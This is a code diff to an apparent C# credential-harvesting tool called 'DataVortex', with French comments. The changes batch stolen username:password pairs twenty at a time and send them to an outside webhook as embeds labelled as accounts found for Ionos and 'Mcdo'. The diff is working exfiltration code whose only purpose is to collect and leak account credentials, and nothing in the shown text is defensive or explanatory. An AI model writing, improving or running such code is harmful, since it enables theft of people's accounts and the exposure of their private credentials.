@@ -164,6 +164,8 @@ namespace DataVortex
 
                         // Build a string with all the unique username:password pairs, excluding "UNKNOWN"
                         var sb = new StringBuilder();
+                        int count = 0; // Initialize a counter for the number of accounts
+
                         foreach (var result in results)
                         {
                             if (result.username != "UNKNOWN" && result.password != "UNKNOWN")
@@ -184,6 +186,34 @@ namespace DataVortex
                                 {
                                     sb.AppendLine($"`{resultString}`");
                                     uniqueResults.Add(resultString);
+                                    count++;
+
+                                    // Si le nombre de comptes atteint 20, envoyez l'embed et réinitialisez le compteur
+                                    if (count >= 20)
+                                    {
+                                        // Ajoutez le champ "Identifiants" uniquement s'il contient des données
+                                        if (sb.Length > 0)
+                                        {
+                                            embed.AddField("Identifiants:", sb.ToString());
+
+                                            // Send the message via the webhook
+                                            await client.SendMessageAsync(embeds: new[] { embed.Build() });
+                                            Console.WriteLine("Embed Ionos envoyé");
+
+                                            // Réinitialisez le compteur et la chaîne des identifiants
+                                            count = 0;
+                                            sb.Clear();
+
+                                            // Réinitialisez l'embed pour le prochain groupe de comptes
+                                            embed = new EmbedBuilder();
+                                            embed.WithTitle("Compte Trouvé - Ionos");
+                                            embed.WithColor(Color.Red); // Change the color to red
+                                            if (!string.IsNullOrEmpty(databaseName))
+                                            {
+                                                embed.AddField("Database", databaseName);
+                                            }
+                                        }
+                                    }
                                 }
                             }
                         }
@@ -196,10 +226,11 @@ namespace DataVortex
 
                             // Send the message via the webhook
                             await client.SendMessageAsync(embeds: new[] { embed.Build() });
-                            Console.WriteLine("Embed ionos envoyé");
+                            Console.WriteLine("Embed Ionos envoyé");
                         }
                     }
                 }
+
 
 
 
@@ -224,6 +255,8 @@ namespace DataVortex
 
                         // Build a string with all the unique username:password pairs, excluding "UNKNOWN"
                         var sb = new StringBuilder();
+                        int count = 0; // Initialize a counter for the number of accounts
+
                         foreach (var result in results)
                         {
                             if (result.username != "UNKNOWN" && result.password != "UNKNOWN")
@@ -242,37 +275,49 @@ namespace DataVortex
 
                                 if (!uniqueResults.Contains(resultString))
                                 {
-                                    if (sb.Length + resultString.Length > 1024)
+                                    sb.AppendLine($"`{resultString}`");
+                                    uniqueResults.Add(resultString);
+                                    count++;
+
+                                    // Si le nombre de comptes atteint 20, envoyez l'embed et réinitialisez le compteur
+                                    if (count >= 20)
                                     {
-                                        // Handle the case where the field value is too long
-                                        Console.WriteLine($"The field value is too long: {resultString}");
-                                        // You can truncate or split the value here and add it to the embed in a way that fits within the limit.
-                                    }
-                                    else
-                                    {
-                                        sb.AppendLine($"`{resultString}`");
-                                        uniqueResults.Add(resultString);
+                                        // Ajoutez le champ "Identifiants" uniquement s'il contient des données
+                                        if (sb.Length > 0)
+                                        {
+                                            embed.AddField("Identifiants:", sb.ToString());
+
+                                            // Send the message via the webhook
+                                            await client.SendMessageAsync(embeds: new[] { embed.Build() });
+                                            Console.WriteLine("Embed Mcdo envoyé");
+
+                                            // Réinitialisez le compteur et la chaîne des identifiants
+                                            count = 0;
+                                            sb.Clear();
+
+                                            // Réinitialisez l'embed pour le prochain groupe de comptes
+                                            embed = new EmbedBuilder();
+                                            embed.WithTitle("Compte Trouvé - Mcdo");
+                                            embed.WithColor(Color.Red); // Change the color to red
+                                            if (!string.IsNullOrEmpty(databaseName))
+                                            {
+                                                embed.AddField("Database", databaseName);
+                                            }
+                                        }
                                     }
                                 }
                             }
                         }
 
-                        // Vérifiez if the field "Identifiants" contains data and is within the length limit
+                        // Vérifiez si le champ "Identifiants" contient des données
                         if (sb.Length > 0)
                         {
-                            // Add the field only if it contains data and is within the length limit
+                            // Ajoutez le champ uniquement s'il contient des données
                             embed.AddField("Identifiants:", sb.ToString());
 
                             // Send the message via the webhook
-                            try
-                            {
-                                await client.SendMessageAsync(embeds: new[] { embed.Build() });
-                                Console.WriteLine("Embed Mcdo envoyé");
-                            }
-                            catch (ArgumentException ex)
-                            {
-                                Console.WriteLine($"An exception occurred when sending the message: {ex.Message}");
-                            }
+                            await client.SendMessageAsync(embeds: new[] { embed.Build() });
+                            Console.WriteLine("Embed Mcdo envoyé");
                         }
                     }
                 }
